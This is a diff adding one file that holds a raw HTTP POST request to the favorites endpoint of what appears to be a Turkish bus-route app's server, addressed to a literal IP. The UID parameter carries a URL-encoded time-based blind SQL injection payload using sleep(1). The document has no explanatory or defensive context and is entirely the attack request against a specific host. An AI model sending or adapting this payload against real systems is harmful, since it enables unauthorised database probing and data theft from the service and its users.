@@ -1,0 +1,14 @@
+POST /mobil/android/favori.asp?SID=0.6757915620561532&VERSION=2.0.5&FNC=FavoriAra HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: otobushatlari 2.0.5 HTC Vision 2.3.3
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 212.175.165.42
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 93
+Connection: close
+
+UID=00000000-4b50-00b6-ffff-ffff877b9194%27+and+NOT+sleep%281%29+and+%271%27%3D%271&TIP=Durak
